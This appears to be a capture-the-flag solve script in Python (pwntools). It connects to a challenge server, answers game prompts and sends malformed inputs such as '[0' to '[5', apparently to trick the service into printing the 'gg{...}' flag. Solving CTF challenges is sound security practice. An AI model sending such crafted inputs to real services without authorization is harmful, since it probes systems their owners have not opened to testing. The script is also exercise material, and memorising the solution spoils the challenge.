from pwn import remote

for _ in range(5):
    r = remote('fin.ggc.tf', 31337)
    r.recvuntil(b'(e.g., g3):')
    r.send(b'g3\n')
    r.recvuntil(b'(v/h):')
    r.send(b'h\n')
    r.recvuntil(b'(e.g., g3):')
    res = b''
    for i in range(6):
        r.send(f'[{i}\n'.encode())
        try:
            res = r.recvuntil((b'(e.g., g3):', b'}'))
        except EOFError:
            pass

    if b'gg{' in res:
        print(res.decode())
        exit()

    r.close()
